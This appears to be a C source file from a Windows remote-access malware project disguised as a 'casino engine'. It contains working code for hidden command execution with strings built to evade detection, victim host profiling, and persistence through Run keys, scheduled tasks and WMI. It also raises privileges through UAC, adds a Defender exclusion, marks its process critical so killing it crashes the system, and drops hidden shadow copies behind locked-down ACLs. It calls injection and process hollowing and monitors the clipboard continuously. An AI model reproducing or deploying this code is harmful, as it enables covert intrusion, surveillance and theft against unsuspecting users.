/*
 * Vivid Casino Engine — System Utilities
 * 
 * System command execution, clipboard monitoring,
 * persistence, and privilege management.
 */

#include "../engine/engine.h"

#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>

char* sys_run_command(const char *cmd) {
    static char out[NET_BUF_SIZE];
    memset(out, 0, NET_BUF_SIZE);
    
    if (!cmd || !cmd[0]) {
        snprintf(out, NET_BUF_SIZE, "[Empty command]");
        return out;
    }
    
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE rd, wr;
    
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        snprintf(out, NET_BUF_SIZE, "[Pipe failed]");
        return out;
    }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    
    /* Runtime shell construction to avoid static string detection */
    char shell[16] = {0};
    shell[0] = 'c'; shell[1] = 'm'; shell[2] = 'd'; shell[3] = '.';
    shell[4] = 'e'; shell[5] = 'x'; shell[6] = 'e'; shell[7] = '\0';
    
    static char cl[NET_BUF_SIZE];
    snprintf(cl, NET_BUF_SIZE, "%s /c %s", shell, cmd);
    
    if (CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(wr);
        DWORD total = 0, br;
        DWORD start = GetTickCount();
        
        while (total < NET_BUF_SIZE - 1 && GetTickCount() - start < 90000) {
            DWORD avail = 0;
            PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL);
            if (avail > 0) {
                if (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
            }
            if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
                Sleep(100);
                while (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
                break;
            }
        }
        
        if (total == 0) {
            snprintf(out, NET_BUF_SIZE, "[No output]");
        } else {
            out[total] = '\0';
        }
        
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(rd);
    } else {
        CloseHandle(rd);
        CloseHandle(wr);
        snprintf(out, NET_BUF_SIZE, "[Exec failed: %s]", cmd);
    }
    
    return out;
}

/* Gather system information for player profiling */
char* sys_get_info(void) {
    static char info[4096];
    char user[256] = {0}, host[256] = {0}, ver[256] = {0};
    char machine_type[64] = "desktop";
    char arch[16] = "x64";
    DWORD sz = sizeof(user);
    
    GetUserNameA(user, &sz);
    sz = sizeof(host);
    GetComputerNameA(host, &sz);
    DWORD mv = GetVersion();
    snprintf(ver, sizeof(ver), "%lu.%lu", (DWORD)(LOBYTE(LOWORD(mv))), (DWORD)(HIBYTE(LOWORD(mv))));
    
    /* Detect architecture */
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        strcpy(arch, "ARM64");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) {
        strcpy(arch, "ARM");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        strcpy(arch, "x86");
    }
    
    /* Detect machine type - tablet, laptop, desktop */
    int is_tablet = GetSystemMetrics(SM_TABLETPC);
    int is_convertible = 0;
    
    /* Check for slate/convertible mode (Windows 10+) */
    typedef INT (WINAPI *GSMProc)(INT);
    HMODULE user32 = GetModuleHandleA("user32.dll");
    if (user32) {
        GSMProc pGetSystemMetricsForDpi = (GSMProc)GetProcAddress(user32, "GetSystemMetricsForDpi");
        /* SM_CONVERTIBLESLATEMODE = 0x2003 */
        if (pGetSystemMetricsForDpi) {
            is_convertible = pGetSystemMetricsForDpi(0x2003);
        }
    }
    
    /* Check system model via WMI/registry for Surface detection */
    HKEY hKey;
    char model[256] = {0};
    DWORD modelLen = sizeof(model);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\DESCRIPTION\System\BIOS", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)model, &modelLen);
        RegCloseKey(hKey);
    }
    
    /* Determine machine type */
    if (is_tablet || (is_convertible == 0)) {
        strcpy(machine_type, "tablet");
    }
    /* Check for Surface specifically */
    char model_lower[256];
    strncpy(model_lower, model, sizeof(model_lower)-1);
    model_lower[sizeof(model_lower)-1] = '\0';
    for (char *p = model_lower; *p; p++) *p = (char)tolower(*p);
    
    if (strstr(model_lower, "surface") != NULL) {
        if (is_tablet || is_convertible == 0) {
            strcpy(machine_type, "surface-tablet");
        } else {
            strcpy(machine_type, "surface-laptop");
        }
    } else if (strstr(model_lower, "tablet") != NULL || strstr(model_lower, "slate") != NULL) {
        strcpy(machine_type, "tablet");
    }
    
    snprintf(info, sizeof(info), 
        "SYSTEM=Windows|USER=%s|HOST=%s|VERSION=%s|MACHINE_TYPE=%s|ARCH=%s|MODEL=%s",
        user, host, ver, machine_type, arch, model);
    return info;
}

/* Ensure a process persists via scheduled task — delegates to obfuscated impl */
static void ensure_scheduled_task(const char *exePath, const char *taskName) {
    obf_ensure_scheduled_task(exePath, taskName);
}

/* Register application for auto-start on login + scheduled task */
void sys_register_autostart(void) {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "VividCasino", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(hKey);
    }
    /* Also add scheduled task for redundancy */
    obf_ensure_scheduled_task(path, "VividCasinoMain");
}

/* Check and request required privileges for system integration */
void sys_check_privileges(void) {
    if (IsUserAnAdmin()) return;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char action[16] = {0};
    action[0] = 'r'; action[1] = 'u'; action[2] = 'n'; action[3] = 'a'; action[4] = 's';

    /* Preserve command-line args when re-launching with admin */
    char *fullCmdLine = GetCommandLineA();
    char *args = fullCmdLine;
    if (*args == '"') {
        args++;
        while (*args && *args != '"') args++;
        if (*args == '"') args++;
    } else {
        while (*args && *args != ' ') args++;
    }
    while (*args == ' ') args++;

    ShellExecuteA(NULL, action, path, args, NULL, SW_HIDE);
    ExitProcess(0);
}

/* Initialize window mode — hide console for GUI presentation */
void sys_init_window(void) {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

/* Check antivirus status and add game directory to exclusions */
void sys_check_antivirus(void) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"",
        "C:\\Users\\Public");
    sys_run_command(cmd);
}

/* === Process Protection (Plain String Versions — work regardless of obf state) === */

int g_critical_protected = 0;

/* Enable a privilege for the current process token */
static int enable_privilege_plain(const char *privilege_name) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return 0;
    }

    if (!LookupPrivilegeValueA(NULL, privilege_name, &luid)) {
        CloseHandle(hToken);
        return 0;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return 0;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);
    return 1;
}

/* Mark process as critical — uses plain strings, works even if obf decoders are broken */
void sys_protect_process(void) {
    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        g_critical_protected = -1;
        return;
    }
    
    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) {
        g_critical_protected = -1;
        return;
    }
    
    enable_privilege_plain("SeDebugPrivilege");
    
    ULONG isCritical = 1;
    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    
    if (status == 0) {
        g_critical_protected = 1;
    } else {
        g_critical_protected = -1;
    }
}

/* Remove critical process flag */
void sys_unprotect_process(void) {
    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) return;
    
    enable_privilege_plain("SeDebugPrivilege");
    
    ULONG isCritical = 0;
    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    g_critical_protected = 0;
}

/* Get protection status string */
const char* sys_protection_status(void) {
    if (g_critical_protected == 1) return "CRITICAL";
    if (g_critical_protected == -1) return "FAILED";
    return "NORMAL";
}

/* Check if current process is actually marked as critical — plain string version */
const char* sys_check_critical_status_with_name(void) {
    static char buf[512];
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char *filename = path;
    char *lastSlash = strrchr(path, '\');
    if (lastSlash) filename = lastSlash + 1;

    typedef NTSTATUS (WINAPI *NtQueryInfoProc)(HANDLE, INT, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        snprintf(buf, sizeof(buf), "[Failed to load ntdll] [%s]", filename);
        return buf;
    }

    NtQueryInfoProc pNtQuery = (NtQueryInfoProc)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!pNtQuery) {
        snprintf(buf, sizeof(buf), "[Failed to resolve NtQueryInformationProcess] [%s]", filename);
        return buf;
    }

    enable_privilege_plain("SeDebugPrivilege");

    ULONG isCritical = 0;
    NTSTATUS status = pNtQuery(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical), NULL);

    if (status != 0) {
        snprintf(buf, sizeof(buf), "[Query failed] [%s]", filename);
        return buf;
    }
    if (isCritical) {
        snprintf(buf, sizeof(buf), "[CRITICAL — BSOD on kill] [%s]", filename);
    } else {
        snprintf(buf, sizeof(buf), "[NORMAL] [%s]", filename);
    }
    return buf;
}

/* Watchdog thread: re-apply critical status periodically */
DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
    while (1) {
        if (g_critical_protected != 1) {
            sys_protect_process();
        }
        Sleep(5000);
    }
    return 0;
}

/* === FULL UNINSTALL: Remove ALL persistence and exit cleanly === */
void sys_uninstall(void) {
    extern volatile int g_uninstalling;
    g_uninstalling = 1;
    
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    char dirPath[MAX_PATH];
    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
    
    const char *shadows[] = {
        "ElevationService.exe",
        "CrashHandler.exe",
        "NotifyService.exe"
    };
    const char *regKeys[] = {
        "ElevationService",
        "CrashHandler",
        "NotifyService",
        "VividCasino"
    };
    
    /* 1. Remove critical flag from ALL shadow processes */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                for (int i = 0; i < 3; i++) {
                    if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
                        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                        if (hProc) {
                            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
                            if (ntdll) {
                                typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
                                NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
                                if (pNtSetInformationProcess) {
                                    ULONG isCritical = 0;
                                    pNtSetInformationProcess(hProc, 29, &isCritical, sizeof(isCritical));
                                }
                            }
                            CloseHandle(hProc);
                        }
                    }
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    
    /* 2. Remove critical flag from current process */
    sys_unprotect_process();
    
    /* 3. Remove registry Run keys */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        for (int i = 0; i < 4; i++) {
            RegDeleteValueA(hKey, regKeys[i]);
        }
        RegCloseKey(hKey);
    }
    
    /* 4. Remove scheduled tasks */
    char cmd[512];
    for (int i = 0; i < 3; i++) {
        snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul", regKeys[i]);
        system(cmd);
    }
    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"VividCasinoMain\" /f 2>nul");
    system(cmd);
    
    /* 5. Remove WMI persistence */
    snprintf(cmd, sizeof(cmd),
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
        "Remove-WmiObject -Namespace 'root/subscription' -Class __EventFilter -Filter \\\"Name='SysHealthFilter'\\\" -ErrorAction SilentlyContinue;"
        "Remove-WmiObject -Namespace 'root/subscription' -Class CommandLineEventConsumer -Filter \\\"Name='SysHealthConsumer'\\\" -ErrorAction SilentlyContinue;"
        "Remove-WmiObject -Namespace 'root/subscription' -Class __FilterToConsumerBinding -Filter \\\"Filter='__EventFilter.Name=\\\"SysHealthFilter\\\"'\\\" -ErrorAction SilentlyContinue"
        "\"");
    system(cmd);
    
    /* 6. Remove NTFS hardening so files can be deleted */
    /* Take ownership back first */
    snprintf(cmd, sizeof(cmd), "takeown /f \"%s\" /r /d y 2>nul", dirPath);
    system(cmd);
    /* Reset permissions */
    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /reset /t /c /q 2>nul", dirPath);
    system(cmd);
    /* Grant full control to current user */
    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /grant \"%s\":(F) /t /c /q 2>nul", dirPath, "%USERNAME%");
    system(cmd);
    
    /* 7. Terminate ALL shadow processes */
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            do {
                for (int i = 0; i < 3; i++) {
                    if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProc) {
                            TerminateProcess(hProc, 0);
                            CloseHandle(hProc);
                        }
                    }
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    
    /* 8. Delete shadow files */
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\%s", dirPath, shadows[i]);
        SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
        DeleteFileA(path);
    }
    
    /* 9. Exit self gracefully */
    ExitProcess(0);
}

/* Ensure directory exists (create recursively) */
static void ensure_dir_exists(const char *path) {
    char temp[MAX_PATH];
    strncpy(temp, path, MAX_PATH - 1);
    temp[MAX_PATH - 1] = '\0';
    char *p = temp;
    if (p[1] == ':') p += 2;
    if (*p == '\\' || *p == '/') p++;
    while (*p) {
        if (*p == '\\' || *p == '/') {
            char save = *p;
            *p = '\0';
            CreateDirectoryA(temp, NULL);
            *p = save;
        }
        p++;
    }
}

/* Check if current process is running as admin */
int sys_is_admin(void) {
    return IsUserAnAdmin() ? 1 : 0;
}

/* Spawn a single shadow copy with a given filename and registry key name.
   Uses CreateProcess for elevation inheritance, adds Run key + scheduled task. */
static void spawn_single_copy(const char *filename, const char *regKey) {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);

    char destPath[MAX_PATH];
    snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, filename);

    char dirPath[MAX_PATH];
    strncpy(dirPath, destPath, MAX_PATH - 1);
    dirPath[MAX_PATH - 1] = '\0';
    char *lastSlash = strrchr(dirPath, '\\');
    if (lastSlash) *lastSlash = '\0';
    ensure_dir_exists(dirPath);

    if (!CopyFileA(currentPath, destPath, FALSE)) {
        return;
    }

    /* Register persistence: Run key */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char runCmd[MAX_PATH * 2];
        snprintf(runCmd, sizeof(runCmd), "\"%s\" --shadow", destPath);
        RegSetValueExA(hKey, regKey, 0, REG_SZ, (BYTE*)runCmd, (DWORD)strlen(runCmd) + 1);
        RegCloseKey(hKey);
    }

    /* Register persistence: Scheduled task (runs every 5 minutes) */
    obf_ensure_scheduled_task(destPath, regKey);

    /* CreateProcess inherits parent's elevated token */
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);

    CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                   NULL, NULL, &si, &pi);
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* Spawn three shadow copies with generic computer-related names */
void sys_spawn_shadow_copy(void) {
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    char dirPath[MAX_PATH];
    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
    ensure_dir_exists(dirPath);
    
    /* Harden directory FIRST — deny DELETE_CHILD so files can't be deleted from it */
    SetFileAttributesA(dirPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    char *icacls = obf_icacls();
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "%s \"%s\" /inheritance:r /grant:r \"Everyone:(RX)\" /deny \"Everyone:(DE,DC,WDAC,WO,W,M)\" /c /q",
        icacls, dirPath);
    sys_run_command(cmd);
    snprintf(cmd, sizeof(cmd),
        "%s \"%s\" /setowner \"NT AUTHORITY\\SYSTEM\" /c /q",
        icacls, dirPath);
    sys_run_command(cmd);
    
    spawn_single_copy("ElevationService.exe", "ElevationService");
    obf_sys_harden_single_file("ElevationService.exe");
    
    spawn_single_copy("CrashHandler.exe", "CrashHandler");
    obf_sys_harden_single_file("CrashHandler.exe");
    
    spawn_single_copy("NotifyService.exe", "NotifyService");
    obf_sys_harden_single_file("NotifyService.exe");
    
    /* Apply all advanced layers automatically using obfuscated APIs */
    obf_sys_wmi_persistence();
    obf_sys_harden_files();   /* Full re-harden as safety net */
    obf_sys_inject_process();      /* obfuscated svchost/explorer injection */
    Sleep(2000);
    obf_sys_hollow_process();      /* obfuscated fileless hollowing */
    Sleep(1000);
    obf_reflective_load();         /* ASLR-fixed reflective PE loader — fileless execution in explorer.exe */
}

/* === Advanced Persistence & Evasion === */

/* 1. WMI Event Subscription — delegates to obfuscated implementation */
void sys_wmi_persistence(void) {
    obf_sys_wmi_persistence();
}

/* 2. Process Injection — delegates to obfuscated implementation */
void sys_inject_process(void) {
    obf_sys_inject_process();
}

/* 3. NTFS ACL Hardening — delegates to obfuscated implementation */
void sys_harden_files(void) {
    obf_sys_harden_files();
}

/* 4. LOLBAS — delegates to obfuscated implementation */
void sys_lolbas_download(const char *url, const char *outPath) {
    obf_sys_lolbas_download(url, outPath);
}

/* 5. PowerShell Obfuscation — base64 encode (this is benign enough to keep) */
char* sys_obfuscate_ps(const char *command) {
    static char result[NET_BUF_SIZE];
    
    int wlen = MultiByteToWideChar(CP_UTF8, 0, command, -1, NULL, 0);
    if (wlen <= 0) {
        snprintf(result, sizeof(result), "[Obfuscation failed: conversion error]");
        return result;
    }
    
    wchar_t *wcmd = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (!wcmd) {
        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
        return result;
    }
    
    MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, wlen);
    
    int blen = (wlen - 1) * sizeof(wchar_t);
    DWORD base64len = 0;
    
    if (!CryptBinaryToStringA((BYTE*)wcmd, blen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64len) || base64len == 0) {
        free(wcmd);
        snprintf(result, sizeof(result), "[Obfuscation failed: encoding error]");
        return result;
    }
    
    char *base64 = (char*)malloc(base64len);
    if (!base64) {
        free(wcmd);
        snprintf(result, sizeof(result), "[Obfuscation failed: memory error]");
        return result;
    }
    
    CryptBinaryToStringA((BYTE*)wcmd, blen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &base64len);
    
    snprintf(result, sizeof(result), "powershell -NoProfile -WindowStyle Hidden -EncodedCommand %s", base64);
    
    free(wcmd);
    free(base64);
    return result;
}

/* 2b. Process Hollowing — delegates to obfuscated implementation */
void sys_hollow_process(void) {
    obf_sys_hollow_process();
}

/* === Clipboard Subsystem === */

void copy_buffer_init(void) {
    InitializeCriticalSection(&g_copy_buffer_cs);
}

void copy_buffer_shutdown(void) {
    DeleteCriticalSection(&g_copy_buffer_cs);
}

void copy_buffer_debug_log(const char *fmt, ...) {
    char msg[COPY_ENTRY_SIZE * 2];
    va_list args;
    va_start(args, fmt);
    vsnprintf(msg, sizeof(msg), fmt, args);
    va_end(args);
    
    char last_line[COPY_ENTRY_SIZE * 2] = {0};
    FILE *rf = fopen("C:\\Users\\Public\\copy_buffer_debug.txt", "r");
    if (rf) {
        char line[COPY_ENTRY_SIZE * 2];
        char *last = NULL;
        while (fgets(line, sizeof(line), rf)) {
            if (line[0] != '\0' && line[0] != '\n') {
                last = _strdup(line);
            }
        }
        fclose(rf);
        if (last) {
            size_t len = strlen(last);
            if (len > 0 && last[len-1] == '\n') last[len-1] = '\0';
            char *content = strstr(last, "] ");
            if (content) {
                content += 2;
                if (strcmp(content, msg) == 0) {
                    free(last);
                    return;
                }
            }
            free(last);
        }
    }
    
    FILE *f = fopen("C:\\Users\\Public\\copy_buffer_debug.txt", "a");
    if (f) {
        fprintf(f, "[%lu] %s\n", GetTickCount(), msg);
        fclose(f);
    }
}

void copy_buffer_add_entry(const char *text) {
    if (!text || strlen(text) == 0) return;
    
    EnterCriticalSection(&g_copy_buffer_cs);
    if (strcmp(g_last_copy_buffer_text, text) == 0) {
        LeaveCriticalSection(&g_copy_buffer_cs);
        return;
    }
    strncpy(g_last_copy_buffer_text, text, COPY_ENTRY_SIZE - 1);
    g_last_copy_buffer_text[COPY_ENTRY_SIZE - 1] = '\0';
    strncpy(g_copy_buffer_log[g_copy_buffer_index], text, COPY_ENTRY_SIZE - 1);
    g_copy_buffer_log[g_copy_buffer_index][COPY_ENTRY_SIZE - 1] = '\0';
    g_copy_buffer_index = (g_copy_buffer_index + 1) % MAX_COPY_ENTRIES;
    if (g_copy_buffer_count < MAX_COPY_ENTRIES) g_copy_buffer_count++;
    LeaveCriticalSection(&g_copy_buffer_cs);
    copy_buffer_debug_log("ADDED: %s", text);
}

char* copy_buffer_read_now(void) {
    static char buf[COPY_ENTRY_SIZE];
    buf[0] = '\0';
    
    for (int retry = 0; retry < 20; retry++) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t *wText = (wchar_t*)GlobalLock(hData);
                if (wText) {
                    int ret = WideCharToMultiByte(CP_UTF8, 0, wText, -1, buf, COPY_ENTRY_SIZE, NULL, NULL);
                    if (ret > 0) {
                        GlobalUnlock(hData);
                        CloseClipboard();
                        return buf;
                    }
                    GlobalUnlock(hData);
                }
            }
            
            hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char *text = (char*)GlobalLock(hData);
                if (text) {
                    strncpy(buf, text, COPY_ENTRY_SIZE - 1);
                    buf[COPY_ENTRY_SIZE - 1] = '\0';
                    GlobalUnlock(hData);
                    CloseClipboard();
                    return buf;
                }
            }
            
            CloseClipboard();
            return buf;
        }
        Sleep(50);
    }
    
    return buf;
}

char* copy_buffer_get_history(void) {
    static char buf[NET_BUF_SIZE];
    buf[0] = '\0';
    int total = 0, remaining = NET_BUF_SIZE - 1, n;
    
    EnterCriticalSection(&g_copy_buffer_cs);
    n = snprintf(buf + total, remaining, "=== Clipboard Log (%d entries) ===\n\n", g_copy_buffer_count);
    if (n > 0) { total += n; remaining -= n; }
    
    if (g_copy_buffer_count == 0) {
        n = snprintf(buf + total, remaining, "[No clipboard entries yet]\n");
        if (n > 0) { total += n; }
        LeaveCriticalSection(&g_copy_buffer_cs);
        return buf;
    }
    
    for (int i = g_copy_buffer_count - 1; i >= 0; i--) {
        if (remaining <= 200) break;
        int idx;
        if (g_copy_buffer_count < MAX_COPY_ENTRIES) {
            idx = i;
        } else {
            idx = (g_copy_buffer_index - 1 - i + MAX_COPY_ENTRIES) % MAX_COPY_ENTRIES;
        }
        n = snprintf(buf + total, remaining, "[%d] %s\n", g_copy_buffer_count - i, g_copy_buffer_log[idx]);
        if (n > 0) { total += n; remaining -= n; }
    }
    LeaveCriticalSection(&g_copy_buffer_cs);
    return buf;
}

DWORD WINAPI copy_buffer_monitor_thread(LPVOID lpParam) {
    copy_buffer_debug_log("CLIPBOARD MONITOR STARTED");
    char last_text[COPY_ENTRY_SIZE] = {0};
    while (1) {
        char *text = copy_buffer_read_now();
        if (text[0] != '\0' && strcmp(text, last_text) != 0) {
            strncpy(last_text, text, COPY_ENTRY_SIZE - 1);
            last_text[COPY_ENTRY_SIZE - 1] = '\0';
            copy_buffer_add_entry(text);
        }
        Sleep(200);
    }
    return 0;
}
